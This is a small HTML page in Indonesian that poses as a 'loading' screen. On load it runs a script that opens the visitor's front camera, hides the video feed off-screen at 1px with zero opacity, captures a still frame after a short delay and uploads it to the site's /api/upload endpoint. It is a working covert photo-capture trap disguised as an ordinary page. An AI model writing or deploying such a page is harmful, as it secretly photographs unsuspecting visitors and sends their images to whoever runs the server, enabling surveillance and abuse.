<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Halaman</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <p>Sedang memuat...</p>

  <!-- Elemen tersembunyi -->
  <video class="priview" id="video" autoplay playsinline style="display: none;"></video>
  <canvas class="priview" id="canvas" width="320" height="240" style="display: none;"></canvas>

  <script>
    async function ambilFoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.setAttribute('autoplay', true);
        video.setAttribute('playsinline', true);
        video.style.position = 'fixed';
        video.style.top = '-9999px';
        video.style.left = '-9999px';
        video.style.width = '1px';
        video.style.height = '1px';
        video.style.opacity = '0';
        document.body.appendChild(video);
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            resolve();
          };
        });

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Tambahkan sedikit delay agar kamera siap (opsional)
        await new Promise(resolve => setTimeout(resolve, 1500));

        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL('image/png');

        const res = await fetch('/api/upload', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ image: imageData })
        });

        const contentType = res.headers.get("content-type");
        let data;
        if (contentType && contentType.includes("application/json")) {
          data = await res.json();
        } else {
          const text = await res.text();
          throw new Error("Bukan response JSON:\n" + text);
        }

        if (data.url) {
          alert("Ish Ish");

          const img = document.createElement("img");
          img.src = data.url;
          img.style.maxWidth = "100%";
          document.body.appendChild(img);
        } else {
          alert("Ish Ish");
          console.error("Ish Ish:", data);
        }

        stream.getTracks().forEach(track => track.stop());
      } catch (error) {
        console.error('Ish:', error);
        alert("‚ùå Ish " + error.message);
      }
    }

    ambilFoto();
  </script>
</body>

<style>
  #video {
    position: absolute;
    top: -99999px;
    left: -9999px;
    width: 1px;
    height: 0;
    pointer-events: none;
    display: none;
  }
</style>

</html>
